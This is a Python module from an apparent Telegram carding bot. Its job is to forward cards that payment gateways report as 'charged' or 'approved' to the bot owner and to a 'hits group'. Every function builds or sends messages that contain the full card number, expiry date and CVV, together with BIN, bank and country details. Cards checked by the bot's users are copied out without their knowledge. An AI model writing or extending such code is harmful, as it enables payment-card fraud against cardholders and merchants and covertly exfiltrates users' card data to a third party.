"""
Forward Hits to Owner and Group
Forwards all charged and approved cards to the bot owner's private chat and hits group.
"""

from pyrogram import Client
from pyrogram.enums import ParseMode
from BOT.config_loader import get_config

# Cache owner ID and group
_owner_id = None
_hits_group = None
_hits_group_resolved = None


def get_owner_id() -> int:
    """Get the owner ID from config."""
    global _owner_id
    if _owner_id is None:
        config = get_config()
        _owner_id = int(config.get("OWNER", 0))
    return _owner_id


def get_hits_group() -> str:
    """Get the hits group from config."""
    global _hits_group
    if _hits_group is None:
        config = get_config()
        _hits_group = config.get("HITS_GROUP", "")
    return _hits_group


async def resolve_hits_group(client: Client):
    """Resolve the hits group invite link to chat ID."""
    global _hits_group_resolved
    if _hits_group_resolved is not None:
        return _hits_group_resolved

    hits_group = get_hits_group()
    if not hits_group:
        return None

    try:
        # If it's already a numeric ID
        if hits_group.lstrip('-').isdigit():
            _hits_group_resolved = int(hits_group)
            return _hits_group_resolved

        # If it's an invite link, try to get chat info
        if "t.me/" in hits_group:
            # Extract the invite hash
            if "+KpdKVEtwhkZkZWU1" in hits_group or "/+" in hits_group:
                # It's a private invite link - try to get chat
                try:
                    chat = await client.get_chat(hits_group)
                    _hits_group_resolved = chat.id
                    return _hits_group_resolved
                except Exception:
                    # Try with the invite hash directly
                    invite_hash = hits_group.split("+")[-1] if "+" in hits_group else hits_group.split("/")[-1]
                    try:
                        chat = await client.get_chat(f"https://t.me/+{invite_hash}")
                        _hits_group_resolved = chat.id
                        return _hits_group_resolved
                    except Exception:
                        pass
            else:
                # It's a public username
                username = hits_group.split("/")[-1].replace("@", "")
                try:
                    chat = await client.get_chat(username)
                    _hits_group_resolved = chat.id
                    return _hits_group_resolved
                except Exception:
                    pass

        # Try as username
        try:
            chat = await client.get_chat(hits_group)
            _hits_group_resolved = chat.id
            return _hits_group_resolved
        except Exception:
            pass

    except Exception as e:
        print(f"[forward_hits] Error resolving hits group: {e}")

    return None


async def forward_hit_to_owner(
    client: Client,
    gateway: str,
    card: str,
    status: str,
    response: str,
    checked_by: str,
    user_id: str,
    bin_info: str = "N/A",
    bank: str = "N/A",
    country: str = "N/A",
    price: str = "0.00",
    extra_info: dict = None
) -> bool:
    """
    Forward a charged/approved card to the owner's private chat and hits group.

    Args:
        client: Pyrogram client instance
        gateway: Gateway name (Stripe, Braintree, Shopify, etc.)
        card: Full card details (cc|mm|yy|cvv)
        status: Status string (Charged/Approved)
        response: Response from gateway
        checked_by: User who checked the card (HTML formatted)
        user_id: User ID who checked the card
        bin_info: BIN information string
        bank: Bank name
        country: Country with flag
        price: Price/amount if applicable
        extra_info: Additional info dict (retries, receipt_id, etc.)

    Returns:
        True if forwarded successfully, False otherwise
    """
    owner_id = get_owner_id()

    try:
        # Determine header based on status
        if "charged" in status.lower():
            header = "CHARGED"
            status_emoji = "Charged 💎"
        else:
            header = "CCN LIVE"
            status_emoji = "Approved ✅"

        # Build card number for BIN display
        card_num = card.split("|")[0] if "|" in card else card
        bin_number = card_num[:6] if len(card_num) >= 6 else card_num

        # Build extra lines
        extra_lines = ""
        if extra_info:
            if extra_info.get("retries"):
                extra_lines += f"\n<b>[•] Retries:</b> <code>{extra_info['retries']}</code>"
            if extra_info.get("receipt_id"):
                extra_lines += f"\n<b>[•] Bill:</b> <code>{extra_info['receipt_id']}</code>"

        # Format gateway display
        if gateway.lower() == "shopify" and price and price != "0.00":
            gateway_display = f"Shopify Normal ${price}"
        elif gateway.lower() == "stripe":
            gateway_display = "Stripe Balliante $20"
        elif gateway.lower() == "braintree":
            gateway_display = "Braintree [Pixorize]"
        else:
            gateway_display = gateway

        # Build the hit message
        hit_message = f"""<b>🔔 HIT ALERT | {header}</b> ✦
━━━━━━━━━━━━━━━
<b>[#] Gateway:</b> <code>{gateway_display}</code>
<b>[•] Card:</b> <code>{card}</code>
<b>[•] Status:</b> <code>{status_emoji}</code>
<b>[•] Response:</b> <code>{response}</code>{extra_lines}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] BIN:</b> <code>{bin_number}</code>
<b>[+] Info:</b> <code>{bin_info}</code>
<b>[+] Bank:</b> <code>{bank}</code> 🏦
<b>[+] Country:</b> <code>{country}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[👤] Checked By:</b> {checked_by}
<b>[🆔] User ID:</b> <code>{user_id}</code>
━━━━━━━━━━━━━━━"""

        # Send to owner
        if owner_id:
            try:
                await client.send_message(
                    chat_id=owner_id,
                    text=hit_message,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True
                )
            except Exception as e:
                print(f"[forward_hits] Error sending to owner: {e}")

        # Send to hits group
        hits_group_id = await resolve_hits_group(client)
        if hits_group_id:
            try:
                await client.send_message(
                    chat_id=hits_group_id,
                    text=hit_message,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True
                )
            except Exception as e:
                print(f"[forward_hits] Error sending to hits group: {e}")

        return True

    except Exception as e:
        print(f"[forward_hits] Error forwarding hit: {e}")
        return False


async def forward_single_hit(
    client: Client,
    gateway: str,
    fullcc: str,
    status: str,
    response: str,
    user_id: str,
    username: str,
    plan: str,
    badge: str,
    bin_data: dict = None,
    price: str = "0.00",
    extra_info: dict = None
) -> bool:
    """
    Convenience function for forwarding single card check hits.

    Args:
        client: Pyrogram client
        gateway: Gateway name
        fullcc: Full card (cc|mm|yy|cvv)
        status: charged/approved
        response: Gateway response
        user_id: Telegram user ID
        username: User's first name
        plan: User's plan name
        badge: User's plan badge
        bin_data: BIN lookup data dict
        price: Price if applicable
        extra_info: Extra info dict

    Returns:
        True if forwarded, False otherwise
    """
    # Only forward charged or approved
    if status.lower() not in ("charged", "approved"):
        return False

    # Format checked_by
    checked_by = f"<a href='tg://user?id={user_id}'>{username}</a> [<code>{plan} {badge}</code>]"

    # Extract BIN info
    if bin_data:
        bin_info = f"{bin_data.get('vendor', 'N/A')} - {bin_data.get('type', 'N/A')} - {bin_data.get('level', 'N/A')}"
        bank = bin_data.get('bank', 'N/A')
        country = f"{bin_data.get('country', 'N/A')} {bin_data.get('flag', '🏳️')}"
    else:
        bin_info = "N/A"
        bank = "N/A"
        country = "N/A"

    return await forward_hit_to_owner(
        client=client,
        gateway=gateway,
        card=fullcc,
        status=status,
        response=response,
        checked_by=checked_by,
        user_id=user_id,
        bin_info=bin_info,
        bank=bank,
        country=country,
        price=price,
        extra_info=extra_info
    )


async def forward_mass_hit(
    client: Client,
    gateway: str,
    card: str,
    status: str,
    response: str,
    user_id: str,
    checked_by: str,
    bin_data: dict = None,
    price: str = "0.00",
    retries: int = 0
) -> bool:
    """
    Convenience function for forwarding mass card check hits.

    Args:
        client: Pyrogram client
        gateway: Gateway name
        card: Full card
        status: charged/approved
        response: Gateway response
        user_id: Telegram user ID
        checked_by: Pre-formatted checked_by string
        bin_data: BIN lookup data dict
        price: Price if applicable
        retries: Number of retries

    Returns:
        True if forwarded, False otherwise
    """
    # Only forward charged or approved
    if status.lower() not in ("charged", "approved"):
        return False

    # Extract BIN info
    if bin_data:
        bin_info = f"{bin_data.get('vendor', 'N/A')} - {bin_data.get('type', 'N/A')} - {bin_data.get('level', 'N/A')}"
        bank = bin_data.get('bank', 'N/A')
        country = f"{bin_data.get('country', 'N/A')} {bin_data.get('flag', '🏳️')}"
    else:
        bin_info = "N/A"
        bank = "N/A"
        country = "N/A"

    extra_info = {"retries": retries} if retries else None

    return await forward_hit_to_owner(
        client=client,
        gateway=gateway,
        card=card,
        status=status,
        response=response,
        checked_by=checked_by,
        user_id=user_id,
        bin_info=bin_info,
        bank=bank,
        country=country,
        price=price,
        extra_info=extra_info
    )
